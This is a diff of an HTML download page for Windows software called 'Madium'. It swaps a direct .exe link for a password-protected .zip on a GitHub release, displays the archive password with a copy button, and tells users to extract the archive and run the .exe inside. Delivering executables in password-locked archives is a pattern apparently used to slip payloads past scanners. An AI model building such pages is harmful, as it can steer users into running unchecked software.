@@ -15,9 +15,14 @@ h1{font-size:26px;font-weight:800;letter-spacing:-.02em;margin-bottom:8px;color:
 .btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;background:#f5a623;color:#000000;padding:14px 32px;border-radius:12px;text-decoration:none;font-weight:700;font-size:15px;transition:all .2s;margin-bottom:24px}
 .btn:hover{transform:translateY(-2px);opacity:.9;box-shadow:0 8px 24px #f5a62340}
 .btn svg{width:18px;height:18px}
-.pw-box{background:rgba(0,0,0,.4);border:1px dashed rgba(245,166,35,.15);border-radius:10px;padding:16px;margin-bottom:24px}
-.pw-label{font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:#8a8a8a;margin-bottom:6px;font-weight:600}
-.pw-code{font-family:monospace;font-size:22px;font-weight:700;color:#f5a623;letter-spacing:.05em}
+.pw-box{background:linear-gradient(180deg, #f5a62315 0%, rgba(0,0,0,.3) 100%);border:1px solid #f5a62340;border-radius:14px;padding:18px;margin-bottom:24px;text-align:left}
+.pw-head{display:flex;align-items:center;gap:8px;margin-bottom:12px}
+.pw-icon{width:16px;height:16px;color:#f5a623;flex-shrink:0}
+.pw-label{font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:#8a8a8a;font-weight:700}
+.pw-row{display:flex;align-items:center;gap:10px;background:rgba(0,0,0,.4);border-radius:10px;padding:12px 14px}
+.pw-code{flex:1;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:20px;font-weight:700;color:#f5a623;letter-spacing:.08em;word-break:break-all}
+.pw-copy{background:#f5a623;color:#000000;border:none;padding:8px 16px;border-radius:8px;font-weight:700;font-size:12px;cursor:pointer;font-family:inherit;transition:opacity .2s;flex-shrink:0}
+.pw-copy:hover{opacity:.85}
 .steps{text-align:left;background:rgba(255,255,255,.03);border:1px solid rgba(245,166,35,.15);border-radius:12px;padding:20px;margin-bottom:24px}
 .steps h3{font-size:12px;text-transform:uppercase;letter-spacing:.08em;color:#8a8a8a;margin-bottom:14px;font-weight:700}
 .step{display:flex;align-items:center;gap:12px;font-size:14px;margin-bottom:10px;color:#f0f0f0}
@@ -38,18 +43,29 @@ h1{font-size:26px;font-weight:800;letter-spacing:-.02em;margin-bottom:8px;color:
   <h1>Download Madium</h1>
   <div class="subtitle">Latest version • Windows</div>
   
-  <a class="btn" href="https://github.com/SphereFalcon/wave-dl-madium/releases/download/v-9dast1/madium.exe">
+  <a class="btn" href="https://github.com/SphereFalcon/wave-dl-madium/releases/download/v-1t8lxr/madium.zip">
     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
-    Download File
+    Download Archive
   </a>
 
-  
+  <div class="pw-box">
+      <div class="pw-head">
+        <svg class="pw-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+        <span class="pw-label">Archive Password</span>
+      </div>
+      <div class="pw-row">
+        <code class="pw-code" id="pw-code">6HHQFV56</code>
+        <button type="button" class="pw-copy" onclick="navigator.clipboard.writeText('6HHQFV56');this.textContent='Copied ✓';const b=this;setTimeout(()=>b.textContent='Copy',1600)">Copy</button>
+      </div>
+    </div>
 
+  
   <div class="steps">
     <h3>Installation Guide</h3>
-    <div class="step"><div class="step-num">1</div>Download the file using the button above</div>
-    <div class="step"><div class="step-num">2</div>Open the installer (exe or zip)</div>
-    <div class="step"><div class="step-num">3</div>Run and follow on-screen instructions</div>
+    <div class="step"><div class="step-num">1</div>Download the <b>.zip</b> archive using the button above</div>
+    <div class="step"><div class="step-num">2</div>Extract it with <b>7-Zip</b> or <b>WinRAR</b></div>
+    <div class="step"><div class="step-num">3</div>Enter the archive password shown above</div>
+    <div class="step"><div class="step-num">4</div>Run the <b>.exe</b> installer and follow the setup</div>
   </div>
 
   <div class="warning">
